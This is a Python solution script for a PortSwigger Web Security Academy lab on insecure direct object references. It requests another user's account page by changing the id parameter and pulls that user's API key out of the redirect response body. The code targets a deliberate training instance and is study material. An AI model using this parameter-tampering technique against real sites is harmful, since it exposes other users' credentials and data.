'''This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect
'''

import requests
import re

lab_id = '0a5e00c70380b235832ceb88007c006d' # change according to generated lab_id

# all we need to do is read the My Account redirect page for carlos to extract the API key. No login necessary
uri = f"https://{lab_id}.web-security-academy.net/my-account?id=carlos"
r1 = requests.get(uri)
for request in r1.history:
        if 'API' in request.text:
                key = re.search(r'API Key is: (\w+)', request.text)
        print(f'Submitting key: {key[1]}')

# Submit the API key to finish the lab
uri = f"https://{lab_id}.web-security-academy.net/submitSolution"
data = { 'answer' : key[1] }
r2 = requests.post(uri, data=data)
print('finished')